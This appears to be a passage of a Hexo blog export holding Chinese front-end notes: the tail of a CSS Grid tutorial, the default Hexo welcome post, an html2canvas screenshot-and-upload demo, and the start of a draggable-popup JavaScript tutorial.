<p>容器我也就理解成父元素（里面必须要有标签包裹的子元素）<br><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line"><span class="attribute">display</span>: grid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//默认情况下容器都是块级元素 但是也可以通过属性设置为行内元素</span></span><br><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line"><span class="attribute">display</span>: inline-grid</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意，设为网格布局以后，容器子元素（项目）的float、display: inline-block、display: table-cell、vertical-align和column-等设置都将失效。</p>
</blockquote>
<h4 id="grid-template-columns-属性，grid-template-rows-属性"><a href="#grid-template-columns-属性，grid-template-rows-属性" class="headerlink" title="grid-template-columns 属性，grid-template-rows 属性"></a>grid-template-columns 属性，grid-template-rows 属性</h4><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    grid-template-column: <span class="number">100px</span> <span class="number">100px</span> <span class="number">100px</span>;</span><br><span class="line">    grid-template-rows: <span class="number">100px</span> <span class="number">100px</span> <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//容器指定了网格布局以后，接着就要划分行和列。grid-template-columns属性定义每一列的列宽，grid-template-rows属性定义每一行的行高。也可以使用百分比。同时可以使用repeat() 第一个参数是数量 第二个是重复的值 repeat(3, 33.3%) repeat(2, 100px 20px 80px</span></span><br><span class="line"><span class="comment">//repeat(auto-fill, 100px)</span></span><br><span class="line"><span class="comment">//有时，单元格的大小是固定的，但是容器的大小不确定。如果希望每一行（或每一列）容纳尽可能多的单元格，这时可以使用auto-fill关键字表示自动填充)</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    grid-template-column: <span class="number">1</span>fr  <span class="number">1</span>fr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//会生成同样宽的两列  代表一个比例</span></span><br><span class="line"><span class="comment">//fr可以与绝对长度的单位结合使用，这时会非常方便。grid-template-column: 150px 1fr 1fr;</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    grid-template-<span class="attribute">columns</span>: <span class="number">1</span>fr <span class="number">1</span>fr minmax(<span class="number">100px</span>, <span class="number">1</span>fr)</span><br><span class="line">&#125;</span><br><span class="line">//minmax()函数产生一个长度范围，表示长度就在这个范围之中。它接受两个参数，分别为最小值和最大值  上面代码中，minmax(<span class="number">100px</span>, <span class="number">1</span>fr)表示列宽不小于<span class="number">100px</span>，不大于<span class="number">1</span>fr</span><br><span class="line"></span><br><span class="line">//除此之外 还有 auto（浏览器自己决定长度） 还可以为自己划分的行和列命名 </span><br><span class="line"></span><br><span class="line">.container &#123;</span><br><span class="line">  display: grid;</span><br><span class="line">  grid-template-<span class="attribute">columns</span>: [c1] <span class="number">100px</span> [c2] <span class="number">100px</span> [c3] auto [c4];</span><br><span class="line">  grid-template-rows: [r1] <span class="number">100px</span> [r2] <span class="number">100px</span> [r3] auto [r4];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="grid-row-gap-属性，grid-column-gap-属性，grid-gap-属性"><a href="#grid-row-gap-属性，grid-column-gap-属性，grid-gap-属性" class="headerlink" title="grid-row-gap 属性，grid-column-gap 属性，grid-gap 属性"></a>grid-row-gap 属性，grid-column-gap 属性，grid-gap 属性</h4><blockquote>
<p>用来设置行间距和列间距<br><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  grid-row-gap: <span class="number">20px</span>;</span><br><span class="line">  grid-<span class="attribute">column-gap</span>: <span class="number">20px</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h4 id="grid-auto-flow"><a href="#grid-auto-flow" class="headerlink" title="grid-auto-flow"></a>grid-auto-flow</h4><blockquote>
<p>划分网格以后，容器的子元素会按照顺序，自动放置在每一个网格。默认的放置顺序是”先行后列”，即先填满第一行，再开始放入第二行，即下图数字的顺序。<br>这个顺序由grid-auto-flow属性决定，默认值是row，即”先行后列”。也可以将它设成column，变成”先列后行”<br><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:grid;</span><br><span class="line">    -<span class="attribute">auto</span>-flow: column;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">设为row dense，表示"先行后列"，并且尽可能紧密填满，尽量不出现空格。</span><br><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:grid;</span><br><span class="line">    -<span class="attribute">auto</span>-flow: row dense;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h4 id="justify-items-属性，align-items-属性，place-items-属性"><a href="#justify-items-属性，align-items-属性，place-items-属性" class="headerlink" title="justify-items 属性，align-items 属性，place-items 属性"></a>justify-items 属性，align-items 属性，place-items 属性</h4><blockquote>
<p>是控制单元格的水平方向和垂直方向的对齐方式<br><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  justify-items: start | end | center | stretch;</span><br><span class="line">  <span class="attribute">align-items</span>: start | end | center | stretch;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
<p>start：对齐单元格的起始边缘。<br>end：对齐单元格的结束边缘。<br>center：单元格内部居中。<br>stretch：拉伸，占满单元格的整个宽度（默认值）。</p>
</blockquote>
<h4 id="justify-content-属性，align-content-属性，place-content-属性"><a href="#justify-content-属性，align-content-属性，place-content-属性" class="headerlink" title="justify-content 属性，align-content 属性，place-content 属性"></a>justify-content 属性，align-content 属性，place-content 属性</h4><blockquote>
<p>前两个和flex中的类似一个是控制整个内容区域水平方向和垂直方向的对齐方式<br><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: start | end | center | stretch | space-around | space-between | space-evenly;</span><br><span class="line">  <span class="attribute">align-content</span>: start | end | center | stretch | space-around | space-between | space-evenly;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//place-content属性是align-content属性和justify-content属性的合并简写形式。place-content: &lt;align-content&gt; &lt;justify-content&gt;</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<h4 id="grid-auto-columns-属性，grid-auto-rows-属性"><a href="#grid-auto-columns-属性，grid-auto-rows-属性" class="headerlink" title="grid-auto-columns 属性，grid-auto-rows 属性"></a>grid-auto-columns 属性，grid-auto-rows 属性</h4><blockquote>
<p>有时候，一些项目的指定位置，在现有网格的外部。比如网格只有3列，但是某一个项目指定在第5行。这时，浏览器会自动生成多余的网格，以便放置项目。<br><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  grid-template-<span class="attribute">columns</span>: <span class="number">100px</span> <span class="number">100px</span> <span class="number">100px</span>;</span><br><span class="line">  grid-template-rows: <span class="number">100px</span> <span class="number">100px</span> <span class="number">100px</span>;</span><br><span class="line">  grid-<span class="attribute">auto</span>-rows: <span class="number">50px</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这样就生成了5行</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="2-项目属性"><a href="#2-项目属性" class="headerlink" title="2.项目属性"></a>2.项目属性</h3><h4 id="grid-column-start-属性，grid-column-end-属性，grid-row-start-属性，grid-row-end-属性"><a href="#grid-column-start-属性，grid-column-end-属性，grid-row-start-属性，grid-row-end-属性" class="headerlink" title="grid-column-start 属性，grid-column-end 属性，grid-row-start 属性，grid-row-end 属性"></a>grid-column-start 属性，grid-column-end 属性，grid-row-start 属性，grid-row-end 属性</h4><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// grid-column-start属性：左边框所在的垂直网格线</span></span><br><span class="line"><span class="comment">// rid-column-end属性：右边框所在的垂直网格线</span></span><br><span class="line"><span class="comment">// grid-row-start属性：上边框所在的水平网格线</span></span><br><span class="line"><span class="comment">// grid-row-end属性：下边框所在的水平网格线</span></span><br><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">  grid-column-start: <span class="number">2</span>;</span><br><span class="line">  grid-column-end: <span class="number">4</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 指定，1号项目的左边框是第二根垂直网格线，右边框是第四根垂直网格线。</span></span><br><span class="line"> <span class="comment">//这四个属性的值还可以使用span关键字，表示"跨越"，即左右边框（上下边框）之间跨越多少个网格。grid-column-start: span 2;</span></span><br></pre></td></tr></table></figure>
<h4 id="grid-column-属性，grid-row-属性"><a href="#grid-column-属性，grid-row-属性" class="headerlink" title="grid-column 属性，grid-row 属性"></a>grid-column 属性，grid-row 属性</h4><blockquote>
<p>grid-column属性是grid-column-start和grid-column-end的合并简写形式，grid-row属性是grid-row-start属性和grid-row-end的合并简写形式。用/分开</p>
</blockquote>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">  grid-column: <span class="number">1</span> / <span class="number">3</span>;</span><br><span class="line">  grid-row: <span class="number">1</span> / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">/* 等同于 */</span></span><br><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">  grid-column-start: <span class="number">1</span>;</span><br><span class="line">  grid-column-end: <span class="number">3</span>;</span><br><span class="line">  grid-row-start: <span class="number">1</span>;</span><br><span class="line">  grid-row-end: <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*这两个属性之中，也可以使用span关键字，表示跨越多少个网格。*/</span></span><br><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#b03532</span>;</span><br><span class="line">  grid-column: <span class="number">1</span> / span <span class="number">2</span>;</span><br><span class="line">  grid-row: <span class="number">1</span> / span <span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="grid-area-属性"><a href="#grid-area-属性" class="headerlink" title="grid-area 属性"></a>grid-area 属性</h4><blockquote>
<p>grid-area属性指定项目放在哪一个区域。</p>
</blockquote>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">  grid-<span class="selector-tag">area</span>: e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  grid-<span class="selector-tag">area</span>: &lt;row-start&gt; / &lt;column-start&gt; / &lt;row-end&gt; / &lt;column-end&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="justify-self-属性，align-self-属性，place-self-属性"><a href="#justify-self-属性，align-self-属性，place-self-属性" class="headerlink" title="justify-self 属性，align-self 属性，place-self 属性"></a>justify-self 属性，align-self 属性，place-self 属性</h4><blockquote>
<p>justify-self属性设置单元格内容的水平位置（左中右），跟justify-items属性的用法完全一致，但只作用于单个项目。align-self属性设置单元格内容的垂直位置（上中下），跟align-items属性的用法完全一致，也是只作用于单个项目。</p>
</blockquote>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  justify-self: start | end | center | stretch;</span><br><span class="line">  <span class="attribute">align-self</span>: start | end | center | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>start：对齐单元格的起始边缘。<br>end：对齐单元格的结束边缘。<br>center：单元格内部居中。<br>stretch：拉伸，占满单元格的整个宽度（默认值）。</p>
<p><a href="http://www.ruanyifeng.com/blog/2019/03/grid-layout-tutorial.html" target="_blank" rel="noopener">CSS Grid网格布局教程</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Css</category>
      </categories>
      <tags>
        <tag>Css</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2018/02/12/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.<br><a id="more"></a></p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      <categories>
        <category>hexo使用说明</category>
      </categories>
      <tags>
        <tag>-系统说明</tag>
      </tags>
  </entry>
  <entry>
    <title>html2canvas的使用</title>
    <url>/2018/09/17/html2canvas%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;上一次自己通过canvas实现了将网页中的部分内容画在图片上，但是这一次自己遇到的需求需要画的内容太多了而且很多动态的图片。这时就需要使用工具了，没错就是用起来超级方便的html2canvas。不用再去慢慢画，直接能够将网页里的一部分生成图片。不过就是有些时候页面中存在外部图片时，可能会出现跨域的问题，设置了它的一个参数好像还是不行。下面就是自己使用的一个小demo<br><a id="more"></a><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"result"</span>&gt;</span><br><span class="line">&lt;img :src=<span class="string">"canvasImgUrl"</span> alt=<span class="string">""</span> @load=<span class="string">"imgLoaded = true"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"img-view"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn"</span> data-html2canvas-ignore=<span class="string">"true"</span> &gt;</span><br><span class="line">&lt;img src=<span class="string">"../assets/images/result_btn.png"</span> @click=<span class="string">"to('/main')"</span>/&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;div id="posterView" v-show="!imgLoaded" class="poster-canvas"&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src="../</span>assets/images/ceshihome_logo.png<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">&lt;div class="</span>peo<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;div class="</span>con-show01<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;div class="</span>con-show02<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;div class="</span>con-show03 bg01<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;img :src="</span>actInfo.userInfo.portrait<span class="string">" class="</span>ico<span class="string">" crossOrigin="</span>anonymous<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">&lt;!--&lt;img src="</span>../assets/images/liu.jpg<span class="string">" class="</span>ico<span class="string">" crossOrigin="</span>anonymous<span class="string">"/&gt;--&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class="</span>info<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;&#123;&#123;actInfo.userInfo.nick&#125;&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class="</span>change<span class="string">"&gt;</span></span><br><span class="line"><span class="string">&lt;img :src='"</span>../../src/assets/images/<span class="string">"+nowtext+"</span>_text.png<span class="string">"' /&gt;</span></span><br><span class="line"><span class="string">&lt;img :src='"</span>../../src/assets/images/<span class="string">"+nowtext+"</span>_des.png<span class="string">"' /&gt;</span></span><br><span class="line"><span class="string">&lt;img :src='"</span>../../src/assets/images/<span class="string">"+now+"</span>_text.png<span class="string">"' /&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;toast&gt;&lt;/toast&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">let option = &#123;</span></span><br><span class="line"><span class="string">useCORS: true,</span></span><br><span class="line"><span class="string">width: '750',</span></span><br><span class="line"><span class="string">scale: .7</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">var that =this;</span></span><br><span class="line"><span class="string">html2canvas(document.getElementById('posterView'), option).then((canvas) =&gt; &#123;</span></span><br><span class="line"><span class="string">let dataURL = canvas.toDataURL("</span>image/jpeg<span class="string">",1)</span></span><br><span class="line"><span class="string">axios.post('https://www.codoon.com/activity/v1/api/upload/dataurl',&#123;</span></span><br><span class="line"><span class="string">data: dataURL,</span></span><br><span class="line"><span class="string">type: 'image/jpeg'</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">.then(function (response) &#123;</span></span><br><span class="line"><span class="string">if(response.status)&#123;</span></span><br><span class="line"><span class="string">that.isGenerate = false</span></span><br><span class="line"><span class="string">that.canvasImgUrl = response.data</span></span><br><span class="line"><span class="string">if(cb)&#123;</span></span><br><span class="line"><span class="string">cb()</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">alert(response.description)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">console.log(response)</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">.catch(function (error) &#123;</span></span><br><span class="line"><span class="string">alert(error);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br></pre></td></tr></table></figure></p>
<p>这里面掉了一个接口 将base64的图片转成了jpg</p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>js实现弹窗的拖拽效果</title>
    <url>/2019/09/22/js%E5%AE%9E%E7%8E%B0%E5%BC%B9%E7%AA%97%E7%9A%84%E6%8B%96%E6%8B%BD%E6%95%88%E6%9E%9C/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;最近的一个项目中遇到了需要对弹窗进行拖拽操作的需求，隐隐约约记得之前实现过，但现在大概api的名字，于是去查了一下移动端的话主要使用touchstart、touchmove、touchend这三个api来实现。PC端的话主要是利用mousedown、mousemove、mouseup这三个api来实现。下面主要介绍一下PC端弹窗的实现。<br><a id="more"></a></p>
<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><hr>
<h4 id="MouseDown"><a href="#MouseDown" class="headerlink" title="MouseDown"></a>MouseDown</h4><blockquote>
<p>onmousedown 事件会在鼠标按键被按下时发生。<br>与 onmousedown 事件相关连得事件发生次序<br>onmousedown-&gt;onmouseup-&gt;onclick<br>触发之后会返回一些相关信息</p>
<p><img src="/images/drag1.png" alt="My Pic"></p>
</blockquote>
<h4 id="MouseMove"><a href="#MouseMove" class="headerlink" title="MouseMove"></a>MouseMove</h4><blockquote>
<p>mousemove 属性在鼠标指针移动到元素上时触发。<br>返回的东西和上面的类似<br>onmousemove 属性可用于使用 HTML 元素，除了: </p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span>&gt;</span>, <span class="tag">&lt;<span class="name">bdo</span>&gt;</span>, <span class="tag">&lt;<span class="name">br</span>&gt;</span>, <span class="tag">&lt;<span class="name">head</span>&gt;</span>, <span class="tag">&lt;<span class="name">html</span>&gt;</span>, <span class="tag">&lt;<span class="name">iframe</span>&gt;</span>, <span class="tag">&lt;<span class="name">meta</span>&gt;</span>, <span class="tag">&lt;<span class="name">param</span>&gt;</span>, <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">, <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml">, and <span class="tag">&lt;<span class="name">title</span>&gt;</span>.</span></span></span><br></pre></td></tr></table></figure>
<h4 id="MouseUp"><a href="#MouseUp" class="headerlink" title="MouseUp"></a>MouseUp</h4><blockquote>
<p>onmouseup 属性在松开鼠标按钮时触发。<br>onmouseup 属性不适用于以下元素：</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span>&gt;</span>, <span class="tag">&lt;<span class="name">bdo</span>&gt;</span>, <span class="tag">&lt;<span class="name">br</span>&gt;</span>, <span class="tag">&lt;<span class="name">head</span>&gt;</span>, <span class="tag">&lt;<span class="name">html</span>&gt;</span>, <span class="tag">&lt;<span class="name">iframe</span>&gt;</span>, <span class="tag">&lt;<span class="name">meta</span>&gt;</span>, <span class="tag">&lt;<span class="name">param</span>&gt;</span>, <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">, <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml">, and <span class="tag">&lt;<span class="name">title</span>&gt;</span>.</span></span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>返回的信息也和上面类似</p>
</blockquote>
<h3 id="几个距离"><a href="#几个距离" class="headerlink" title="几个距离"></a>几个距离</h3><hr>
<h4 id="clientX-OR-clientY"><a href="#clientX-OR-clientY" class="headerlink" title="clientX OR clientY"></a>clientX OR clientY</h4><blockquote>
<p>点击位置距离当前body可视区域的x，y坐标</p>
</blockquote>
<h4 id="pageX-OR-pageY"><a href="#pageX-OR-pageY" class="headerlink" title="pageX OR pageY"></a>pageX OR pageY</h4><blockquote>
<p>对于整个页面来说，包括了被卷去的body部分的长度</p>
</blockquote>
<h4 id="screenX-OR-screenY"><a href="#screenX-OR-screenY" class="headerlink" title="screenX OR screenY"></a>screenX OR screenY</h4><blockquote>
<p>点击位置距离当前电脑屏幕的x，y坐标</p>
</blockquote>
<h4 id="offsetX-OR-offsetY"><a href="#offsetX-OR-offsetY" class="headerlink" title="offsetX OR offsetY"></a>offsetX OR offsetY</h4><blockquote>
<p>相对于带有定位的父盒子的x，y坐标</p>
</blockquote>
<p><img src="/images/drag2.png" alt="My Pic"></p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><blockquote>
<p>利用这三个api以及clientX和clientY以及offsetX和offsetY实现</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>弹窗拖拽<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    *&#123;margin:0;padding:0;&#125;</span></span><br><span class="line"><span class="undefined">    .box&#123;position: absolute;width: 400px;height: 300px;top:100px;left:100px;border:1px solid #001c67;background: #&#125;</span></span><br><span class="line"><span class="undefined">    .move&#123;position: absolute;width: 100px;height: 100px;top:100px;left:150px;border:1px solid #000;&#125;</span></span><br><span class="line"><span class="undefined">    .move:hover&#123;cursor: move;&#125;</span></span><br><span class="line"><span class="undefined">    .close&#123;position: absolute;width: 30px;height: 30px;top:0px;right:0px;background:red;text-align: center;line-height: 30px;&#125;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> oMove=<span class="built_in">document</span>.getElementById(<span class="string">'move'</span>);</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 拖曳</span></span></span><br><span class="line"><span class="undefined">      oMove.onmousedown=fnDown;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 关闭</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> oClose=<span class="built_in">document</span>.getElementById(<span class="string">'close'</span>);</span></span><br><span class="line"><span class="javascript">      oClose.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">       <span class="built_in">document</span>.getElementById(<span class="string">'box'</span>).style.display=<span class="string">'none'</span>;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">fnDown</span>(<span class="params">event</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(event)</span></span><br><span class="line"><span class="javascript">      event = event || <span class="built_in">window</span>.event;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> oDrag=<span class="built_in">document</span>.getElementById(<span class="string">'box'</span>),</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 光标按下时光标和面板之间的距离</span></span></span><br><span class="line"><span class="undefined">        disX=event.clientX-oDrag.offsetLeft,</span></span><br><span class="line"><span class="undefined">        disY=event.clientY-oDrag.offsetTop;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 移动</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.onmousemove=<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        event = event || <span class="built_in">window</span>.event;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> l=event.clientX-disX,</span></span><br><span class="line"><span class="undefined">          t=event.clientY-disY,</span></span><br><span class="line"><span class="javascript">          <span class="comment">// 最大left,top值</span></span></span><br><span class="line"><span class="javascript">          leftMax=(<span class="built_in">document</span>.documentElement.clientWidth || <span class="built_in">document</span>.body.clientWidth)-oDrag.offsetWidth,</span></span><br><span class="line"><span class="javascript">          topMax=(<span class="built_in">document</span>.documentElement.clientHeight || <span class="built_in">document</span>.body.clientHeight)-oDrag.offsetHeight;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(l&lt;<span class="number">0</span>) l=<span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(l&gt;leftMax) l=leftMax;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(t&lt;<span class="number">0</span>) t=<span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(t&gt;topMax) t=topMax;</span></span><br><span class="line"><span class="javascript">        oDrag.style.left=l+<span class="string">'px'</span>;</span></span><br><span class="line"><span class="javascript">        oDrag.style.top=t+<span class="string">'px'</span>;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 释放鼠标</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.onmouseup=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.onmousemove=<span class="literal">null</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.onmouseup=<span class="literal">null</span>;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span> <span class="attr">id</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"move"</span> <span 